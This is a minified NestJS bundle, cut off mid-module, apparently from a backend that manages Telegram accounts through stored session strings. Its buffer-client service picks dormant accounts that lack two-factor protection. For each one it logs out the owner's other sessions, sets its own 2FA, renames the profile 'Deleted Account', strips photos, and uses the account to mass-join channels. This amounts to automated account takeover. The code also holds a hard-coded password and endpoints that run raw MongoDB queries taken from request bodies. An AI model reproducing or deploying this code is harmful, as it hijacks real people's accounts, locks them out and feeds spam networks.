i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateActiveChannelDto=void 0;const r=o(9742);class a{constructor(){this.reactRestricted=!1,this.wordRestriction=0,this.dMRestriction=0,this.reactions=["❤","🔥","👏","🥰","😁","🤔","🤯","😱","🤬","😢","🎉","🤩","🤮","💩","🙏","👌","🕊","🤡","🥱","🥴","😍","🐳","❤‍🔥","💯","🤣","💔","🏆","😭","😴","👍","🌚","⚡","🍌","😐","💋","👻","👀","🙈","🤝","🤗","🆒","🗿","🙉","🙊","🤷","👎"],this.banned=!1,this.private=!1}}t.CreateActiveChannelDto=a,i([(0,r.ApiProperty)(),n("design:type",String)],a.prototype,"channelId",void 0),i([(0,r.ApiProperty)({default:!1}),n("design:type",Boolean)],a.prototype,"broadcast",void 0),i([(0,r.ApiProperty)({default:!0}),n("design:type",Boolean)],a.prototype,"canSendMsgs",void 0),i([(0,r.ApiProperty)({default:300}),n("design:type",Number)],a.prototype,"participantsCount",void 0),i([(0,r.ApiProperty)({default:!1}),n("design:type",Boolean)],a.prototype,"restricted",void 0),i([(0,r.ApiProperty)({default:!0}),n("design:type",Boolean)],a.prototype,"sendMessages",void 0),i([(0,r.ApiProperty)({default:!1}),n("design:type",Boolean)],a.prototype,"reactRestricted",void 0),i([(0,r.ApiProperty)(),n("design:type",String)],a.prototype,"title",void 0),i([(0,r.ApiProperty)(),n("design:type",String)],a.prototype,"username",void 0),i([(0,r.ApiProperty)({default:0}),n("design:type",Number)],a.prototype,"wordRestriction",void 0),i([(0,r.ApiProperty)({default:0}),n("design:type",Number)],a.prototype,"dMRestriction",void 0),i([(0,r.ApiProperty)({type:[String]}),n("design:type",Array)],a.prototype,"availableMsgs",void 0),i([(0,r.ApiProperty)({type:[String],default:["❤","🔥","👏","🥰","😁","🤔","🤯","😱","🤬","😢","🎉","🤩","🤮","💩","🙏","👌","🕊","🤡","🥱","🥴","😍","🐳","❤‍🔥","💯","🤣","💔","🏆","😭","😴","👍","🌚","⚡","🍌","😐","💋","👻","👀","🙈","🤝","🤗","🆒","🗿","🙉","🙊","🤷","👎"]}),n("design:type",Array)],a.prototype,"reactions",void 0),i([(0,r.ApiProperty)({default:!1}),n("design:type",Boolean)],a.prototype,"banned",void 0),i([(0,r.ApiProperty)({default:!0,required:!1}),n("design:type",Boolean)],a.prototype,"megagroup",void 0),i([(0,r.ApiProperty)({default:!1,required:!1}),n("design:type",Boolean)],a.prototype,"forbidden",void 0),i([(0,r.ApiProperty)({description:"Whether the channel is private",example:!1,required:!1}),n("design:type",Boolean)],a.prototype,"private",void 0)},5926:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdateActiveChannelDto=void 0;const i=o(9742),n=o(3585);class r extends((0,i.PartialType)(n.CreateActiveChannelDto)){}t.UpdateActiveChannelDto=r},925:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.ActiveChannelSchema=t.ActiveChannel=void 0;const r=o(5839),a=o(6037),s=o(9742),c=o(6185);let l=class{};t.ActiveChannel=l,i([(0,s.ApiProperty)({required:!0}),(0,r.Prop)({required:!0,unique:!0}),n("design:type",String)],l.prototype,"channelId",void 0),i([(0,s.ApiProperty)({default:!1}),(0,r.Prop)({default:!1}),n("design:type",Boolean)],l.prototype,"broadcast",void 0),i([(0,s.ApiProperty)({default:!0}),(0,r.Prop)({default:!0}),n("design:type",Boolean)],l.prototype,"canSendMsgs",void 0),i([(0,s.ApiProperty)({type:Number,default:0}),(0,r.Prop)({type:a.Schema.Types.Number,default:0}),n("design:type",Number)],l.prototype,"participantsCount",void 0),i([(0,s.ApiProperty)({default:!1}),(0,r.Prop)({default:!1}),n("design:type",Boolean)],l.prototype,"restricted",void 0),i([(0,s.ApiProperty)({default:!1}),(0,r.Prop)({default:!1}),n("design:type",Boolean)],l.prototype,"sendMessages",void 0),i([(0,s.ApiProperty)({required:!0}),(0,r.Prop)({required:!0}),n("design:type",String)],l.prototype,"title",void 0),i([(0,s.ApiProperty)({required:!1,default:null}),(0,r.Prop)({required:!1,default:null}),n("design:type",String)],l.prototype,"username",void 0),i([(0,s.ApiProperty)({type:Number,default:0}),(0,r.Prop)({type:a.Schema.Types.Number,default:0}),n("design:type",Number)],l.prototype,"wordRestriction",void 0),i([(0,s.ApiProperty)({type:Number,default:0}),(0,r.Prop)({type:a.Schema.Types.Number,default:0}),n("design:type",Number)],l.prototype,"dMRestriction",void 0),i([(0,s.ApiProperty)({type:[String],default:c.defaultMessages}),(0,r.Prop)({type:[String],default:c.defaultMessages}),n("design:type",Array)],l.prototype,"availableMsgs",void 0),i([(0,s.ApiProperty)({type:[String],default:c.defaultReactions}),(0,r.Prop)({type:[String],default:c.defaultReactions}),n("design:type",Array)],l.prototype,"reactions",void 0),i([(0,s.ApiProperty)({default:!1}),(0,r.Prop)({default:!1}),n("design:type",Boolean)],l.prototype,"banned",void 0),i([(0,s.ApiProperty)({default:!0}),(0,r.Prop)({default:!0}),n("design:type",Boolean)],l.prototype,"megagroup",void 0),i([(0,s.ApiProperty)({default:!1}),(0,r.Prop)({default:!1}),n("design:type",Boolean)],l.prototype,"private",void 0),i([(0,s.ApiProperty)({default:!1}),(0,r.Prop)({default:!1}),n("design:type",Boolean)],l.prototype,"reactRestricted",void 0),i([(0,s.ApiProperty)({default:!1}),(0,r.Prop)({default:!1}),n("design:type",Boolean)],l.prototype,"forbidden",void 0),t.ActiveChannel=l=i([(0,r.Schema)({collection:"activeChannels",versionKey:!1,autoIndex:!0,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],l),t.ActiveChannelSchema=r.SchemaFactory.createForClass(l)},6501:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ArchivedClientController=void 0;const a=o(3563),s=o(9742),c=o(9646),l=o(9815),p=o(1167),d=o(7908);let u=class{constructor(e){this.archivedclientService=e}async create(e){return this.archivedclientService.create(e)}async search(e){return this.archivedclientService.search(e)}async findAll(){return this.archivedclientService.findAll()}async checkArchivedClients(){return this.archivedclientService.checkArchivedClients()}async findOne(e){return this.archivedclientService.findOne(e)}async fetchOne(e){return this.archivedclientService.fetchOne(e)}async update(e,t){return this.archivedclientService.update(e,t)}async remove(e){return this.archivedclientService.remove(e)}async executeQuery(e){try{return await this.archivedclientService.executeQuery(e)}catch(e){throw e}}};t.ArchivedClientController=u,i([(0,a.Post)(),(0,s.ApiOperation)({summary:"Create user data"}),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[l.CreateClientDto]),n("design:returntype",Promise)],u.prototype,"create",null),i([(0,a.Get)("search"),(0,s.ApiOperation)({summary:"Search user data"}),r(0,(0,a.Query)()),n("design:type",Function),n("design:paramtypes",[p.SearchClientDto]),n("design:returntype",Promise)],u.prototype,"search",null),i([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get all user data"}),n("design:type",Function),n("design:paramtypes",[]),n("design:returntype",Promise)],u.prototype,"findAll",null),i([(0,a.Get)("checkArchivedClients"),(0,s.ApiOperation)({summary:"Get user data by ID"}),n("design:type",Function),n("design:paramtypes",[]),n("design:returntype",Promise)],u.prototype,"checkArchivedClients",null),i([(0,a.Get)(":mobile"),(0,s.ApiOperation)({summary:"Get user data by ID"}),r(0,(0,a.Param)("mobile")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"findOne",null),i([(0,a.Get)("fetchOne/:mobile"),(0,s.ApiOperation)({summary:"Get user data by ID"}),r(0,(0,a.Param)("mobile")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"fetchOne",null),i([(0,a.Patch)(":mobile"),(0,s.ApiOperation)({summary:"Update user data by ID"}),r(0,(0,a.Param)("mobile")),r(1,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[String,d.UpdateClientDto]),n("design:returntype",Promise)],u.prototype,"update",null),i([(0,a.Delete)(":mobile"),(0,s.ApiOperation)({summary:"Delete user data by ID"}),r(0,(0,a.Param)("mobile")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"remove",null),i([(0,a.Post)("query"),(0,s.ApiOperation)({summary:"Execute a custom MongoDB query"}),(0,s.ApiBody)({type:Object}),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[Object]),n("design:returntype",Promise)],u.prototype,"executeQuery",null),t.ArchivedClientController=u=i([(0,s.ApiTags)("Archived Clients"),(0,a.Controller)("archived-clients"),n("design:paramtypes",[c.ArchivedClientService])],u)},6061:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.ArchivedClientModule=void 0;const n=o(3563),r=o(5839),a=o(1013),s=o(282),c=o(9646),l=o(6501),p=o(5774),d=o(8009);let u=class{};t.ArchivedClientModule=u,t.ArchivedClientModule=u=i([(0,n.Module)({imports:[p.initModule,r.MongooseModule.forFeature([{collection:"ArchivedClients",name:"ArchivedArchivedClientsModule",schema:a.ClientSchema}]),(0,n.forwardRef)((()=>s.TelegramModule)),(0,n.forwardRef)((()=>d.ClientModule))],controllers:[l.ArchivedClientController],providers:[c.ArchivedClientService],exports:[c.ArchivedClientService]})],u)},9646:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ArchivedClientService=void 0;const a=o(3563),s=o(5839),c=o(6037),l=o(2995),p=o(7385),d=o(5562),u=o(6185);let y=class{constructor(e,t,o){this.archivedclientModel=e,this.telegramService=t,this.clientService=o}async create(e){return new this.archivedclientModel(e).save()}async findAll(){return await this.archivedclientModel.find().exec()}async findOne(e){const t=(await this.archivedclientModel.findOne({mobile:e}).exec())?.toJSON();return t}async fetchOne(e){const t=(await this.archivedclientModel.findOne({mobile:e}).exec())?.toJSON();if(t)return t;try{await this.telegramService.createClient(e,!1,!0);const t=await this.telegramService.createNewSession(e);return await this.telegramService.deleteClient(e),await this.create({channelLink:"default",clientId:"default",dbcoll:"default",deployKey:"default",link:"default",mainAccount:"default",promoteRepl:"default",name:"default",password:"Ajtdmwajt1@",repl:"default",session:t,username:"default",mobile:e,product:"default"})}catch(t){throw await this.telegramService.deleteClient(e),new a.NotFoundException((0,u.parseError)(t).message)}}async update(e,t){return delete t._id,t._doc&&delete t._doc._id,console.log({...t}),await this.archivedclientModel.findOneAndUpdate({mobile:e},{$set:t},{new:!0,upsert:!0}).exec()}async remove(e){const t=await this.archivedclientModel.findOneAndDelete({mobile:e}).exec();if(!t)throw new a.NotFoundException(`Client with ID "${e}" not found`);return t}async search(e){return console.log(e),e.firstName&&(e.firstName={$regex:new RegExp(e.firstName,"i")}),console.log(e),this.archivedclientModel.find(e).exec()}async checkArchivedClients(){await this.telegramService.disconnectAll(),await(0,p.sleep)(2e3);const e=await this.findAll(),t=(await this.clientService.findAll()).map((e=>e.mobile));return e.map((async e=>{if(t.includes(e.mobile))console.log("Number is a Active Client");else try{await this.telegramService.createClient(e.mobile,!0,!1),await this.telegramService.updateUsername(e.mobile,""),await this.telegramService.updateNameandBio(e.mobile,"Deleted Account",""),await this.telegramService.deleteClient(e.mobile),await(0,p.sleep)(2e3)}catch(t){console.log(e.mobile," :  false"),this.remove(e.mobile),await this.telegramService.deleteClient(e.mobile)}})),"Triggered ArchiveClients check"}async executeQuery(e){try{if(!e)throw new a.BadRequestException("Query is invalid.");return await this.archivedclientModel.find(e).exec()}catch(e){throw new a.InternalServerErrorException(e.message)}}};t.ArchivedClientService=y,t.ArchivedClientService=y=i([(0,a.Injectable)(),r(0,(0,s.InjectModel)("ArchivedArchivedClientsModule")),r(1,(0,a.Inject)((0,a.forwardRef)((()=>l.TelegramService)))),r(2,(0,a.Inject)((0,a.forwardRef)((()=>d.ClientService)))),n("design:paramtypes",[c.Model,l.TelegramService,d.ClientService])],y)},5853:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.BufferClientController=void 0;const a=o(3563),s=o(9742),c=o(4374),l=o(9139),p=o(2843),d=o(5042);let u=class{constructor(e){this.clientService=e}async create(e){return this.clientService.create(e)}async search(e){return this.clientService.search(e)}async joinChannelsforBufferClients(){return this.clientService.joinchannelForBufferClients()}async checkbufferClients(){return this.clientService.checkBufferClients(),"initiated Checking"}async addNewUserstoBufferClients(e){return this.clientService.addNewUserstoBufferClients(e.badIds,e.goodIds),"initiated Checking"}async findAll(){return this.clientService.findAll()}async setAsBufferClient(e){return await this.clientService.setAsBufferClient(e)}async findOne(e){return this.clientService.findOne(e)}async update(e,t){return this.clientService.update(e,t)}async createdOrupdate(e,t){return this.clientService.createOrUpdate(e,t)}async remove(e){return this.clientService.remove(e)}async executeQuery(e){try{return await this.clientService.executeQuery(e)}catch(e){throw e}}};t.BufferClientController=u,i([(0,a.Post)(),(0,s.ApiOperation)({summary:"Create user data"}),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[l.CreateBufferClientDto]),n("design:returntype",Promise)],u.prototype,"create",null),i([(0,a.Get)("search"),(0,s.ApiOperation)({summary:"Search user data"}),r(0,(0,a.Query)()),n("design:type",Function),n("design:paramtypes",[p.SearchBufferClientDto]),n("design:returntype",Promise)],u.prototype,"search",null),i([(0,a.Get)("joinChannelsForBufferClients"),(0,s.ApiOperation)({summary:"Join Channels for BufferClients"}),n("design:type",Function),n("design:paramtypes",[]),n("design:returntype",Promise)],u.prototype,"joinChannelsforBufferClients",null),i([(0,a.Get)("checkBufferClients"),(0,s.ApiOperation)({summary:"Check Buffer Clients"}),n("design:type",Function),n("design:paramtypes",[]),n("design:returntype",Promise)],u.prototype,"checkbufferClients",null),i([(0,a.Post)("addNewUserstoBufferClients"),(0,s.ApiOperation)({summary:"Add New Users to Buffer Clients"}),(0,s.ApiBody)({type:Object}),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[Object]),n("design:returntype",Promise)],u.prototype,"addNewUserstoBufferClients",null),i([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get all user data"}),n("design:type",Function),n("design:paramtypes",[]),n("design:returntype",Promise)],u.prototype,"findAll",null),i([(0,a.Get)("SetAsBufferClient/:mobile"),(0,s.ApiOperation)({summary:"Set as Buffer Client"}),(0,s.ApiParam)({name:"mobile",description:"User mobile number",type:String}),r(0,(0,a.Param)("mobile")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"setAsBufferClient",null),i([(0,a.Get)(":mobile"),(0,s.ApiOperation)({summary:"Get user data by ID"}),r(0,(0,a.Param)("mobile")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"findOne",null),i([(0,a.Patch)(":mobile"),(0,s.ApiOperation)({summary:"Update user data by ID"}),r(0,(0,a.Param)("mobile")),r(1,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[String,d.UpdateBufferClientDto]),n("design:returntype",Promise)],u.prototype,"update",null),i([(0,a.Put)(":mobile"),(0,s.ApiOperation)({summary:"Update user data by ID"}),r(0,(0,a.Param)("mobile")),r(1,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[String,d.UpdateBufferClientDto]),n("design:returntype",Promise)],u.prototype,"createdOrupdate",null),i([(0,a.Delete)(":mobile"),(0,s.ApiOperation)({summary:"Delete user data by ID"}),r(0,(0,a.Param)("mobile")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"remove",null),i([(0,a.Post)("query"),(0,s.ApiOperation)({summary:"Execute a custom MongoDB query"}),(0,s.ApiBody)({type:Object}),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[Object]),n("design:returntype",Promise)],u.prototype,"executeQuery",null),t.BufferClientController=u=i([(0,s.ApiTags)("Buffer Clients"),(0,a.Controller)("bufferclients"),n("design:paramtypes",[c.BufferClientService])],u)},8421:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.BufferClientModule=void 0;const n=o(3563),r=o(5839),a=o(4374),s=o(5853),c=o(9035),l=o(282),p=o(3322),d=o(7422),u=o(8009),y=o(5774),m=o(1324),h=o(1373);let f=class{};t.BufferClientModule=f,t.BufferClientModule=f=i([(0,n.Module)({imports:[y.initModule,r.MongooseModule.forFeature([{name:"bufferClientModule",schema:c.BufferClientSchema,collection:"bufferClients"}]),(0,n.forwardRef)((()=>l.TelegramModule)),(0,n.forwardRef)((()=>d.UsersModule)),(0,n.forwardRef)((()=>p.ActiveChannelsModule)),(0,n.forwardRef)((()=>u.ClientModule)),(0,n.forwardRef)((()=>m.ChannelsModule)),(0,n.forwardRef)((()=>h.PromoteClientModule))],controllers:[s.BufferClientController],providers:[a.BufferClientService],exports:[a.BufferClientService]})],f)},4374:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.BufferClientService=void 0;const a=o(9597),s=o(3563),c=o(5839),l=o(6037),p=o(2995),d=o(7385),u=o(9127),y=o(9155),m=o(6185),h=o(5562),f=o(1870);let g=class{constructor(e,t,o,i,n,r,a){this.bufferClientModel=e,this.telegramService=t,this.usersService=o,this.activeChannelsService=i,this.clientService=n,this.channelsService=r,this.promoteClientService=a,this.joinChannelMap=new Map}async create(e){return new this.bufferClientModel(e).save()}async findAll(){return this.bufferClientModel.find().exec()}async findOne(e,t=!0){const o=(await this.bufferClientModel.findOne({mobile:e}).exec())?.toJSON();if(!o&&t)throw new s.NotFoundException(`BufferClient with mobile ${e} not found`);return o}async update(e,t){const o=await this.bufferClientModel.findOneAndUpdate({mobile:e},{$set:t},{new:!0,upsert:!0,returnDocument:"after"}).exec();if(!o)throw new s.NotFoundException(`User with mobile ${e} not found`);return o}async createOrUpdate(e,t){const o=(await this.bufferClientModel.findOne({mobile:e}).exec())?.toJSON();return o?(console.log("Updating"),this.update(o.mobile,t)):(console.log("creating"),this.create(t))}async remove(e){if(await(0,m.fetchWithTimeout)(`${(0,m.ppplbot)()}&text=${encodeURIComponent(`Deleting Buffer Client : ${e}`)}`),0===(await this.bufferClientModel.deleteOne({mobile:e}).exec()).deletedCount)throw new s.NotFoundException(`BufferClient with mobile ${e} not found`)}async search(e){return console.log(e),e.firstName&&(e.firstName={$regex:new RegExp(e.firstName,"i")}),console.log(e),this.bufferClientModel.find(e).exec()}async executeQuery(e,t,o,i){try{if(!e)throw new s.BadRequestException("Query is invalid.");const n=this.bufferClientModel.find(e);return t&&n.sort(t),o&&n.limit(o),i&&n.skip(i),await n.exec()}catch(e){throw new s.InternalServerErrorException(e.message)}}removeFromBufferMap(e){this.joinChannelMap.delete(e)}clearBufferMap(){console.log("BufferMap cleared"),this.joinChannelMap.clear()}async joinchannelForBufferClients(e=!0){if(!this.telegramService.getActiveClientSetup()){console.log("Joining Channel Started"),await this.telegramService.disconnectAll(),this.clearJoinChannelInterval(),await(0,d.sleep)(2e3);const t=e?[]:Array.from(this.joinChannelMap.keys()),o=await this.bufferClientModel.find({channels:{$lt:350},mobile:{$nin:t}}).sort({channels:1}).limit(4);if(o.length>0){for(const e of o)try{const t=await this.telegramService.createClient(e.mobile,!1,!1);console.log("Started Joining for : ",e.mobile);const o=await t.channelInfo(!0);console.log("Existing Channels Length : ",o.ids.length),await this.update(e.mobile,{channels:o.ids.length});let i=[];o.canSendFalseCount<50?(i=o.ids.length<220?await this.channelsService.getActiveChannels(150,0,o.ids):await this.activeChannelsService.getActiveChannels(150,0,o.ids),this.joinChannelMap.set(e.mobile,i),await this.telegramService.deleteClient(e.mobile)):t.leaveChannels(o.canSendFalseChats)}catch(t){await this.telegramService.deleteClient(e.mobile),(0,m.parseError)(t)}this.joinChannelQueue()}return console.log("Joining Channel Triggered Succesfully for ",o.length),`Initiated Joining channels ${o.length}`}console.log("ignored active check buffer channels as active client setup exists")}async joinChannelQueue(){Array.from(this.joinChannelMap.keys()).length>0&&(this.joinChannelIntervalId=setInterval((async()=>{const e=Array.from(this.joinChannelMap.keys());if(e.length>0){console.log("In JOIN CHANNEL interval: ",(new Date).toISOString());for(const t of e){const e=this.joinChannelMap.get(t);if(e&&e.length>0){const o=e.shift();console.log(t," Pending Channels :",e.length),this.joinChannelMap.set(t,e);try{await this.telegramService.createClient(t,!1,!1),console.log(t," Trying to join :",o.username),await this.telegramService.tryJoiningChannel(t,o)}catch(e){await this.telegramService.deleteClient(t);const i=(0,m.parseError)(e,`${t} @${o.username} Outer Err ERR: `);"CHANNELS_TOO_MUCH"!=e.errorMessage&&"FloodWaitError"!=i.error||(this.removeFromBufferMap(t),await this.telegramService.getChannelInfo(t,!0))}await this.telegramService.deleteClient(t)}else this.joinChannelMap.delete(t)}}else this.clearJoinChannelInterval()}),24e4))}clearJoinChannelInterval(){this.joinChannelIntervalId&&(clearInterval(this.joinChannelIntervalId),this.joinChannelIntervalId=null,setTimeout((()=>{this.joinchannelForBufferClients(!1)}),3e4))}async setAsBufferClient(e,t=new Date(Date.now()-864e5).toISOString().split("T")[0]){if(!(await this.usersService.search({mobile:e}))[0])throw new s.BadRequestException("user not found");if(await this.findOne(e,!1))throw new s.ConflictException("BufferClient already exist");const o=await this.clientService.findAll(),i=o.map((e=>e?.mobile));if(o.flatMap((e=>e?.promoteMobile)).includes(e)||i.includes(e))throw new s.BadRequestException("Number is a Active Client");try{const t=await this.telegramService.createClient(e,!1);await t.set2fa(),await(0,d.sleep)(15e3),await t.updateUsername(""),await(0,d.sleep)(3e3),await t.updatePrivacyforDeletedAccount(),await(0,d.sleep)(3e3),await t.updateProfile("Deleted Account","Deleted Account")}catch(e){const t=(0,m.parseError)(e);throw new s.HttpException(t.message,parseInt(t.status))}return await this.telegramService.deleteClient(e),"Client set as buffer successfully"}async checkBufferClients(){if(this.telegramService.getActiveClientSetup())console.log("ignored active check buffer channels as active client setup exists");else{await this.telegramService.disconnectAll(),await(0,d.sleep)(2e3);const e=await this.findAll();let t=[],o=[];if(e.length<70)for(let t=0;t<70-e.length;t++)o.push(t.toString());const i=await this.clientService.findAll(),n=await this.promoteClientService.findAll(),r=[...i.map((e=>e.mobile)),...i.flatMap((e=>e.promoteMobile))],a=n.map((e=>e.mobile));new Date(Date.now()).toISOString().split("T")[0];for(const i of e)if(r.includes(i.mobile)||a.includes(i.mobile))console.log("Number is a Active Client"),t.push(i.mobile),this.remove(i.mobile);else try{const e=await this.telegramService.createClient(i.mobile,!0,!1),n=await e.getMe();n.username&&(await this.telegramService.updateUsername(i.mobile,""),await(0,d.sleep)(2e3)),"Deleted Account"!==n.firstName&&(await this.telegramService.updateNameandBio(i.mobile,"Deleted Account",""),await(0,d.sleep)(2e3)),await this.telegramService.deleteProfilePhotos(i.mobile),await e.hasPassword()?(console.log(i.mobile," :  ALL Good"),t.push(i.mobile)):(console.log("Client does not have password"),o.push(i.mobile)),await this.telegramService.deleteClient(i.mobile),await(0,d.sleep)(2e3)}catch(e){(0,m.parseError)(e),o.push(i.mobile),this.remove(i.mobile),await this.telegramService.deleteClient(i.mobile)}t=[...t,...r,...a],console.log("GoodIds: ",t.length,"BadIds : ",o.length),this.addNewUserstoBufferClients(o,t)}}async addNewUserstoBufferClients(e,t){const o=new Date(Date.now()-7776e6).toISOString().split("T")[0],i=await this.usersService.executeQuery({mobile:{$nin:t},expired:!1,twoFA:!1,lastActive:{$lt:o},totalChats:{$gt:250}},{tgId:1},e.length+3);for(console.log("New buffer documents to be added: ",i.length);e.length>0&&i.length>0;){const t=i.shift();try{try{const o=await this.telegramService.createClient(t.mobile,!1),i=await o.hasPassword();if(console.log("hasPassword: ",i),i)console.log("Failed to Update as BufferClient has Password"),await this.usersService.update(t.tgId,{twoFA:!0}),await this.telegramService.deleteClient(t.mobile);else{await o.removeOtherAuths(),await o.set2fa(),console.log("waiting for setting 2FA"),await(0,d.sleep)(3e4),await o.updateUsername(""),await(0,d.sleep)(3e3),await o.updatePrivacyforDeletedAccount(),await(0,d.sleep)(3e3),await o.updateProfile("Deleted Account","Deleted Account"),await(0,d.sleep)(3e3),await o.deleteProfilePhotos(),await(0,d.sleep)(2e3),await this.telegramService.removeOtherAuths(t.mobile);const i=await o.channelInfo(!0);console.log("Inserting Document");const n={tgId:t.tgId,session:t.session,mobile:t.mobile,availableDate:new Date(Date.now()-864e5).toISOString().split("T")[0],channels:i.ids.length};await this.create(n),await this.usersService.update(t.tgId,{twoFA:!0}),console.log("=============Created BufferClient============="),await this.telegramService.deleteClient(t.mobile),e.pop()}}catch(e){(0,m.parseError)(e),await this.telegramService.deleteClient(t.mobile)}}catch(e){(0,m.parseError)(e),console.error("An error occurred:",e)}await this.telegramService.deleteClient(t.mobile)}setTimeout((()=>{this.joinchannelForBufferClients()}),12e4)}};t.BufferClientService=g,t.BufferClientService=g=i([(0,s.Injectable)(),r(0,(0,c.InjectModel)("bufferClientModule")),r(1,(0,s.Inject)((0,s.forwardRef)((()=>p.TelegramService)))),r(2,(0,s.Inject)((0,s.forwardRef)((()=>u.UsersService)))),r(3,(0,s.Inject)((0,s.forwardRef)((()=>y.ActiveChannelsService)))),r(4,(0,s.Inject)((0,s.forwardRef)((()=>h.ClientService)))),r(5,(0,s.Inject)((0,s.forwardRef)((()=>y.ActiveChannelsService)))),r(6,(0,s.Inject)((0,s.forwardRef)((()=>f.PromoteClientService)))),n("design:paramtypes",[l.Model,p.TelegramService,u.UsersService,y.ActiveChannelsService,h.ClientService,a.ChannelsService,f.PromoteClientService])],g)},9139:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof 